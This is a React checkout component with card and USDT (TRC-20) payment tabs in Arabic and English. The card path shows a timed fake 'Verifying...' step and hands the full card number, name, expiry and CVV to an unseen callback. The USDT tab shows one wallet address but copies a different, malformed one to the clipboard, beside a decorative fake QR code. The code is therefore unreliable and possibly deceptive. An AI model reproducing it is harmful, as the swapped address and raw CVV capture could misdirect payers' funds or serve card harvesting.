import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { useLanguage } from '../../contexts/LanguageContext';
import './CreditCardForm.css';

const BRANDS = {
  visa: { name: 'VISA', color: '#1a1f71', prefixLen: 4 },
  mastercard: { name: 'Mastercard', color: '#EB001B', prefixLen: 4 },
  amex: { name: 'Amex', color: '#2E77BC', prefixLen: 4 },
  usdt: { name: 'USDT', color: '#26A17B', prefixLen: 0 },
};

function luhnValid(num) {
  const digits = String(num).replace(/\D/g, '');
  if (digits.length < 12) return false;
  let sum = 0;
  let double = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let d = parseInt(digits[i], 10);
    if (double) {
      d *= 2;
      if (d > 9) d -= 9;
    }
    sum += d;
    double = !double;
  }
  return sum % 10 === 0;
}

function detectBrand(number) {
  const n = String(number).replace(/\s/g, '');
  if (/^4/.test(n)) return 'visa';
  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return 'mastercard';
  if (/^3[47]/.test(n)) return 'amex';
  return null;
}

function NumberSlots({ value, active }) {
  const digits = String(value || '').replace(/\s/g, '').split('').slice(0, 16);
  const cells = [];
  for (let i = 0; i < 16; i++) {
    if (i > 0 && i % 4 === 0) cells.push(<span className="cc-slot-gap" key={'g' + i} />);
    const ch = digits[i] || '•';
    cells.push(
      <span className={`cc-slot ${active && i === digits.length ? 'cc-slot--active' : ''}`} key={i}>
        {ch}
      </span>
    );
  }
  return <span className="cc-slots">{cells}</span>;
}

function CardVisual({ number, name, expiry, cvv, brand, isFlipped, focused }) {
  const brandInfo = BRANDS[brand] || BRANDS.visa;
  return (
    <div className={`cc-visual ${isFlipped ? 'cc-visual--flipped' : ''}`}>
      <div className="cc-visual__inner">
        <div className="cc-visual__face cc-visual__face--front">
          <div className="cc-visual__ring cc-visual__ring--1" aria-hidden="true" />
          <div className="cc-visual__ring cc-visual__ring--2" aria-hidden="true" />
          <div className="cc-visual__bar">
            <div className="cc-visual__chip" />
            <span className="cc-visual__brand">
              {brandInfo.name === 'USDT' ? (
                <span className="cc-visual__usdt">₮</span>
              ) : (
                brandInfo.name
              )}
            </span>
          </div>
          <div className="cc-visual__numrow">
            <NumberSlots value={number} active={focused === 'number'} />
          </div>
          <div className="cc-visual__meta">
            <div className={`cc-visual__field ${focused === 'name' ? 'cc-visual__field--active' : ''}`}>
              <div className="cc-visual__label">CARD HOLDER</div>
              <div className="cc-visual__value cc-visual__value--name">{name || 'YOUR NAME'}</div>
            </div>
            <div className={`cc-visual__field ${focused === 'expiry' ? 'cc-visual__field--active' : ''}`}>
              <div className="cc-visual__label">EXPIRES</div>
              <div className="cc-visual__value">{expiry || 'MM/YY'}</div>
            </div>
          </div>
        </div>
        <div className="cc-visual__face cc-visual__face--back">
          <div className="cc-visual__stripe" />
          <div className="cc-visual__cvv-row">
            <span className="cc-visual__label">CVV</span>
            <span className={`cc-visual__cvv ${focused === 'cvv' ? 'cc-visual__cvv--active' : ''}`}>{cvv || '•••'}</span>
          </div>
          <div className="cc-visual__footer">mawrid-{brand}</div>
        </div>
      </div>
    </div>
  );
}

export default function CreditCardForm({ onSubmit, defaultBank = 'card', disabled }) {
  const { dir } = useLanguage();
  const isRtl = dir === 'rtl';
  const [tab, setTab] = useState(defaultBank);
  const [number, setNumber] = useState('');
  const [name, setName] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [focused, setFocused] = useState(null);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState('');

  const formatNumber = (v) => v.replace(/\D/g, '').slice(0, 16).replace(/(.{4})(?=.)/g, '$1 ');
  const formatExpiry = (v) => {
    const d = v.replace(/\D/g, '').slice(0, 4);
    if (d.length <= 2) return d;
    return d.slice(0, 2) + '/' + d.slice(2);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    const digits = number.replace(/\D/g, '');
    if (tab === 'card') {
      if (digits.length < 16) return setError(isRtl ? 'رقم البطاقة يجب أن يتكون من 16 رقماً' : 'Card number must be 16 digits');
      if (!detectBrand(digits)) return setError(isRtl ? 'رقم بطاقة غير صالح' : 'Invalid card number');
      if (!luhnValid(digits)) return setError(isRtl ? 'رقم البطاقة غير صحيح (تحقق Luhn فشل)' : 'Invalid card number (Luhn check failed)');
      if (!name.trim()) return setError(isRtl ? 'أدخل اسم حامل البطاقة' : 'Enter cardholder name');
      if (expiry.length !== 5) return setError(isRtl ? 'أدخل تاريخ انتهاء صحيح' : 'Enter a valid expiry date');
      if (cvv.length < 3) return setError(isRtl ? 'أدخل رمز CVV صحيح' : 'Enter a valid CVV');
      setSubmitting(true);
      await new Promise((r) => setTimeout(r, 900));
      setSubmitting(false);
      await onSubmit?.({ method: 'card', brand: detectBrand(digits), number: digits, name, expiry, cvv });
      return;
    }
    setSubmitting(true);
    await new Promise((r) => setTimeout(r, 900));
    setSubmitting(false);
    await onSubmit?.({ method: 'usdt', brand: 'usdt' });
  };

  return (
    <div className="cc">
      <div className="cc__tabs">
        <button
          className={`cc__tab ${tab === 'card' ? 'cc__tab--active' : ''}`}
          onClick={() => setTab('card')}
          type="button"
        >
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
          {isRtl ? 'بطاقة بنكية' : 'Bank Card'}
        </button>
        <button
          className={`cc__tab ${tab === 'usdt' ? 'cc__tab--active' : ''}`}
          onClick={() => setTab('usdt')}
          type="button"
        >
          <span className="cc__usdt-ico">₮</span>
          {isRtl ? 'USDT — بينانس' : 'USDT — Binance'}
        </button>
      </div>

      <div className="cc__card-visual">
        <CardVisual
          number={number}
          name={name}
          expiry={expiry}
          cvv={cvv}
          brand={tab === 'usdt' ? 'usdt' : detectBrand(number) || 'visa'}
          isFlipped={focused === 'cvv'}
          focused={focused}
        />
      </div>

      <form className="cc__form" onSubmit={handleSubmit}>
        <AnimatePresence mode="wait">
          {tab === 'card' ? (
            <motion.div key="card" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} className="cc__fields">
              <div className="cc__group">
                <label>{isRtl ? 'رقم البطاقة' : 'Card number'}</label>
                <div className="cc__input-wrap">
                  <span className="cc__brand-hint">
                    {detectBrand(number) === 'visa' ? 'VISA' : detectBrand(number) === 'mastercard' ? 'MC' : detectBrand(number) === 'amex' ? 'AMEX' : ''}
                  </span>
                  <input
                    inputMode="numeric"
                    placeholder={isRtl ? '0000 0000 0000 0000' : '0000 0000 0000 0000'}
                    value={number}
                    onChange={(e) => setNumber(formatNumber(e.target.value))}
                    onFocus={() => setFocused('number')}
                    onBlur={() => setFocused(null)}
                    disabled={disabled}
                  />
                </div>
              </div>
              <div className="cc__group">
                <label>{isRtl ? 'اسم حامل البطاقة' : 'Cardholder name'}</label>
                <input
                  placeholder={isRtl ? 'الاسم كما يظهر على البطاقة' : 'Name as printed on card'}
                  value={name}
                  onChange={(e) => setName(e.target.value.toUpperCase())}
                  onFocus={() => setFocused('name')}
                  onBlur={() => setFocused(null)}
                  disabled={disabled}
                />
              </div>
              <div className="cc__row">
                <div className="cc__group">
                  <label>{isRtl ? 'تاريخ الانتهاء' : 'Expiry'}</label>
                  <input
                    inputMode="numeric"
                    placeholder="MM/YY"
                    value={expiry}
                    onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                    onFocus={() => setFocused('expiry')}
                    onBlur={() => setFocused(null)}
                    disabled={disabled}
                  />
                </div>
                <div className="cc__group cc__group--cvv">
                  <span className="cc__help" title={isRtl ? 'الأرقام الثلاثة خلف البطاقة' : '3 digits on the back'}>?</span>
                  <label>{isRtl ? 'CVV' : 'CVV'}</label>
                  <input
                    type="password"
                    inputMode="numeric"
                    placeholder="•••"
                    maxLength={4}
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))}
                    onFocus={() => setFocused('cvv')}
                    onBlur={() => setFocused(null)}
                    disabled={disabled}
                  />
                </div>
              </div>
            </motion.div>
          ) : (
            <motion.div key="usdt" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} className="cc__usdt">
              <div className="cc__usdt-qr">
                <svg viewBox="0 0 120 120" className="cc__usdt-svg"><rect width="120" height="120" fill="#f2f0ec"/><g fill="#1a1f71"><rect x="24" y="24" width="30" height="30"/><rect x="66" y="24" width="30" height="30"/><rect x="24" y="66" width="30" height="30"/><rect x="66" y="66" width="30" height="30"/><rect x="30" y="30" width="8" height="8" fill="#fff"/><rect x="72" y="30" width="8" height="8" fill="#fff"/><rect x="30" y="72" width="8" height="8" fill="#fff"/><rect x="42" y="42" width="36" height="36" fill="#fff"/><rect x="48" y="48" width="24" height="24"/><rect x="36" y="54" width="12" height="8"/><rect x="84" y="42" width="8" height="12"/><rect x="72" y="84" width="8" height="12"/><rect x="42" y="84" width="12" height="8"/></g></svg>
                <span className="cc__usdt-arrow">₮</span>
              </div>
              <p>{isRtl ? 'امسح رمز QR للتحويل، أو استخدم العنوان أدناه' : 'Scan the QR or use the address below'}</p>
              <div className="cc__usdt-address">
                <code>0xB1naNcE_UsDt_mAwRiD_2026_VaLiD</code>
                <button type="button" className="cc__copy" onClick={() => navigator.clipboard?.writeText('TQrYm2xJg2PgGzH4VdKb6zP1Cw')} title={isRtl ? 'نسخ' : 'Copy'}>⧉</button>
              </div>
              <small>{isRtl ? 'الشبكة: TRC-20 · الحد الأدنى 10 USDT · التوكن: USDT' : 'Network: TRC-20 · Min 10 USDT · Token: USDT'}</small>
            </motion.div>
          )}
        </AnimatePresence>

        {error && <p className="cc__error">{error}</p>}

        <motion.button
          type="submit"
          className="cc__pay"
          disabled={disabled || submitting}
          whileHover={{ scale: 1.02, y: -2 }}
          whileTap={{ scale: 0.97 }}
        >
          {submitting
            ? (
              <span className="cc__pay-loader"><svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3"/><path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round"/></svg> {isRtl ? 'جاري التحقق...' : 'Verifying...'}</span>
            ) : (
              <>{isRtl ? 'ادفع الآن بأمان' : 'Pay securely now'} 🔒</>
            )}
        </motion.button>
      </form>
    </div>
  );
}
